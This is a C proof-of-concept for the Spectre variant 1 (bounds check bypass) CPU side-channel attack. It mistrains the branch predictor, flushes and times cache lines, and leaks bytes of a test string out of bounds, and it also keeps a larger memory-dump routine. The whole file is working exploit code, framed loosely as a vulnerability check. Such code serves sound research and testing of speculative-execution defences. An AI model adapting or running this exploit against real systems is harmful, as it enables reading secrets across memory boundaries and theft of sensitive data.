#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

// Constants
#define INDEX_COUNT 16
#define PAGES 256
#define PAGE_SIZE 512
#define MAX_TRIES 1000
#define CACHE_HIT_THRESHOLD 80
#define TRICK_INTERVAL 8
#define TRICK_ITERACTIONS 128
#define NEEDED_CONFIRMATIONS 4

// Global variables that will be used in this attack
unsigned int indexArraySize = INDEX_COUNT;
uint8_t indexArray[INDEX_COUNT];
uint8_t attackArray[PAGES * PAGE_SIZE];
char *secret = "This is just a random test";

void initGlobalCacheableVariables(){
  int i;
  memset(&attackArray, 0, sizeof(attackArray));
  for(i=0; i < INDEX_COUNT; i++){
    indexArray[i]=i+1;
  }
}

void accessPage(int page) {
  int value=0;
  if (page < indexArraySize) {
    value = value & attackArray[indexArray[page] * PAGE_SIZE];
  }
}

static inline int checkSuccess(int a, int b){
  if(a >= (2 * b + 5)){
    return 0;
  }
  return -1;
}

static inline int getProbableByteValue(int results[]){
  int i,first=-1,second=-1;

  for (i = 0; i < 256; i++) {
    if (first < 0 || results[i] >= results[first]) {
      second = first;
      first = i;
    } else if (second < 0 || results[i] >= results[second]) {
      second = i;
    }
  }
  if (checkSuccess(results[first],results[second])){
    return first;
  }
  return -1;
}

/**
 * CLFLUSH—Flush Cache Line
 * 
 * Invalidates the cache line that contains the linear
 * address specified with the source operand from all levels of the processor
 * cache hierarchy (data and instruction). The invalidation is broadcast
 * throughout the cache coherence domain. If, at any level of the cache
 * hierarchy, the line is inconsistent with memory (dirty) it is written to
 * memory before invalidation. The source operand is a byte memory location.
 ***/

static inline void clflush(uint8_t *ptr, int pages){
  int i;
  for(i = 0; i < pages; ++i){
    _mm_clflush(&ptr[i * PAGE_SIZE]);
  }
}

static inline void clflushSingle(unsigned int *ptr){
  _mm_clflush(ptr);
}

/**
   Do something else just to waste some CPU cycles
 */ 
static inline void wasteSomeCycles(){
  int x = 7;
  for(int i=0; i<10000; ++i){
    x = x * x + i;
    x = x << 5;
    x = x | x;
  };
}

void trickBranchPredictor(size_t target, int index){
  int i;
  size_t dummyIndex, page;

  dummyIndex = index;

  // Completely flush our target from memory
  clflush(attackArray, PAGES);

  for (i = 0; i <= TRICK_ITERACTIONS; ++i) {
    // Flush the size of the array from the index
    clflushSingle(&indexArraySize);
    wasteSomeCycles();

    /**
       Bit twiddling technique extracted from original exploit
       if(i % TRICK_INTERVAL == 0){
         uses our target address
       }else{
         uses our valid address
       }
     */

    page = ((i % TRICK_INTERVAL) - 1) & 0xFFFF0000;
    page = (page | (page >> 16));
    page = dummyIndex ^ (page & (target ^ dummyIndex));

    accessPage(page);
  }
}

uint64_t timeDiff(uint8_t *ptr){
  uint64_t diff=0, start=0, end=0;
  int tmp = 0;

  start = __rdtscp(&tmp);
  // Just access the memory region where ptr points to
  tmp = *ptr;
  end = __rdtscp(&tmp);

  diff = end - start;
  return diff;
}

void analyseCachedPages(int results[], int index){
  int i, page;
  uint8_t *address;
  uint64_t diff=0;

  for(i = 0; i < 256; i++) {
    page = ((i * 151) + 17) & 255;
    address = & attackArray[page * 512];

    diff = timeDiff(address);

    if (diff <= CACHE_HIT_THRESHOLD && page != index + 1)
      /* There was a cache hit, increment the possibility of
         the current index being the right byte */
      results[page]++;
  }

}

int readMemoryLocation(size_t address) {
  int results[256];
  int tries, index= 0, ret=-1, last=-1, repeat=0;

  for (tries = 0; tries < MAX_TRIES && repeat < NEEDED_CONFIRMATIONS; ++tries) {
    memset(&results, 0, sizeof(results));
    index = tries % indexArraySize;
    trickBranchPredictor(address, index);

    analyseCachedPages(results, index);
    /**
     * Find the biggest value index in results. It will indicate which
     * byte has the highest probability of being guessed
     **/
    last = ret;
    ret = getProbableByteValue(results);
    if(ret != -1){
    
      if(last == ret){
        repeat++;
      }else{
        repeat=0;
      }
    }
  }
  return ret;
}

int checkVulnerability(){
  int dumpSize=26, count=0;
  char byteRead=0;
  unsigned long long int baseAddress = (unsigned long long int)(secret-(char*)indexArray);
  unsigned long long int address;
  unsigned long long int finalAddress = baseAddress + dumpSize;

  initGlobalCacheableVariables();

 // printf("[+] Testing for Spectre\n");
  //printf("[+] Dumping memory from %p to %p\n", baseAddress, finalAddress);
  for(address = baseAddress; address < finalAddress; ++address){
    byteRead = readMemoryLocation(address);
    printf("%c:",byteRead);
    /*if(secret[count] != byteRead ){
      break;
    }*/
    count++;
  }
  // If we weren't able to dump everything, something went wrong
 /* if(count != dumpSize){
    printf("[-] Dumped bytes don't match the expected output, maybe you aren't vulnerable");
    return -1;
  }
  printf("[+] Dumped bytes match the expected value\n");
  printf("[+] System vulnerable to spectre\n");*/
  return 0;
}

// This function was only kept because it can be useful for debugging purposes
void dumpMemory(){
  int dumpSize=128, byteRead=0, count=0;
  unsigned long long int baseAddress = (unsigned long long int)(secret-(char*)indexArray);
  unsigned long long int address;
  unsigned long long int finalAddress = baseAddress + dumpSize;

  if( finalAddress < baseAddress ){
    finalAddress = 0xffffffffffffffff;
  }

  initGlobalCacheableVariables();

  printf("Dumping memory range %p-%p\n", baseAddress, finalAddress);
  for(address = baseAddress; address < finalAddress; ++address){
    byteRead = readMemoryLocation(address);
    if( byteRead > 31 && byteRead < 127 ){
      printf("%c", byteRead );
    }else{
      printf("?");
    }
    if( ++count % 64 == 0){
      printf("\n");
    }
  }
  printf("\n");
}

int main(int argc, char *argv[]) {
  checkVulnerability();
  return 0;
}
